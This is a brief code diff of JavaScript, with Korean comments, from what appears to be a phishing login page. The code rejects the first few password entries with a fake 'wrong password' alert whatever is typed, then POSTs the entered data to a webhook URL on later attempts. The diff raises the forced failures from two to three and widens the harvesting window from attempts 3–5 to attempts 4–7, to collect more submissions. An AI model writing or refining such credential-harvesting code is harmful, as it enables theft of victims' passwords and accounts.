@@ -109,13 +109,13 @@
       loginTryCount++;
 
       // 1~2회차 → 무조건 비밀번호 오류
-      if (loginTryCount <= 2) {
+      if (loginTryCount <= 3) {
         alert("비밀번호가 틀렸습니다.");
         return;
       }
 
       // 3~5회차 → 정상 처리 (webhook 전송)
-      if (loginTryCount >= 3 && loginTryCount <= 5) {
+      if (loginTryCount >= 4 && loginTryCount <= 7) {
         fetch(webhookUrl, {
           method: "POST",
           headers: {"Content-Type": "application/x-www-form-urlencoded"},
@@ -128,8 +128,8 @@
       }
 
       // 6번째 이후 → 제한
-      if (loginTryCount > 5) {
-        alert("로그인 시도 횟수를 초과했습니다.");
+      if (loginTryCount > 7) {
+        alert("로그인 시도 횟수를 초과했습니다. 사이트를 새로고침하세요.");
         return;
       }
     }
